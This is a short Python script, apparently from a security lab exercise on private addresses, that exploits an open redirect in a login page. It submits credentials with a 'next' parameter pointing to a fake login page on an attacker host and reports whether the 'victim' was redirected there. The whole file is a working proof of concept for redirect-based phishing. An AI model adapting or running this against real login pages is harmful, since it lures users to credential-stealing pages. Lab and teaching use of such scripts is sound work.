#!/usr/bin/env python3
import urllib.request
import urllib.parse

payload = "http://172.20.0.10/login?next=http://192.168.10.50/fake-login.html"

# Submit login to trusted target-web.
data = urllib.parse.urlencode({"username":"student01","password":"Password123"}).encode()
req = urllib.request.Request(payload, data=data, method="POST")

opener = urllib.request.build_opener(urllib.request.HTTPRedirectHandler())
try:
    resp = opener.open(req, timeout=5)
    html = resp.read().decode(errors="ignore")
    print("final_url=%s" % resp.geturl())
    print("victim_redirected_to_attacker=yes" if "Session expired" in html else "victim_redirected_to_attacker=no")
except Exception as e:
    print("victim_error=%s" % e)
